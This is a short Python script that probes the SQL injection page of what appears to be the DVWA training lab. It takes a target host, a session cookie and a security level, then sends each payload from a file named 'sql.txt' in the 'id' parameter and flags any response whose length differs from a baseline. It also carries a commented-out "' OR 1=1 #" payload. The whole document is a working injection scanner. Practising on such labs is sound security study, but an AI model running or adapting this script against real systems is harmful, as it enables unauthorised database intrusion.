import requests
import argparse

parser = argparse.ArgumentParser(description= "target's vpn")
parser.add_argument('vpn', metavar='vpn', type=str, help= 'enter the vpn of your target')
parser.add_argument('Cookie', metavar='Cookie', type=str, help='enter the Cookie of your target')
parser.add_argument('security', metavar='security', type=str, help='enter the security of your target')
args = parser.parse_args()

vpn = args.vpn

Cookie = args.Cookie

security = args.security





url = 'http://' + vpn + '/vulnerabilities/sqli/'

#value = "' OR 1=1 #"
param_name = "id"

normal_params = {
    param_name : "",
    "Submit" : "Submit#"
}


headers = {
    "Host" : vpn,
    "Referer" : "http://" + vpn + "/vulnerabilities/sqli/?id=&Submit=Submit",
    "Cookie" : Cookie + "; security=" + security
}

response = requests.get(url, headers=headers, params=normal_params)

code = response.status_code
resp = response.text

#-------------------------------------
payloads = open("sql.txt").read().splitlines()
for value in payloads:
    params = {
        param_name : value,
        "Submit" : "Submit#"
    }
    
#-------------------------------------------------------------------------
    testResponse = requests.get(url, headers=headers, params=params)
    testCode = testResponse.status_code
    testResp = testResponse.text

    

    if len(testResp) != len(resp):
        print(f"{value} can cause SQL Injection!!!")
#--------------------------------------------------------------------------